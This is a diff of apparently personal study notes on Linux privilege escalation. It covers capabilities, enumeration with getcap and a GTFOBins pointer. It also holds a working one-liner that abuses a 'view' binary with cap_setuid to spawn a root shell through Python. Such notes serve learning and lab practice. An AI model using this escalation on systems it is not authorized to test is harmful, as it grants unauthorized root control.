@@ -50,7 +50,7 @@ Privilege escalation means gaining higher permissions from a lower-level account
 
 - System administrators can use **Capabilities** to give specific privileges to a process or binary without granting full root access.  For example, if a SOC analyst needs to use a tool that requires opening network connections, a regular user cannot do it. without give the user full privileges, the admin can assign the required **Capability** to the tool. This allows the tool to work without needing root access.
 - We can use the `getcap` tool to list enabled capabilities.  (   getcap -r / 2>/dev/null  )
-- cd /home/ubuntu
+- if found cap_setuid+ep  search about the program in https://gtfobins.github.io/
 - ./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'   you must sure the version of python in the machine
 
 ## Privilege Escalation: Cron Jobs
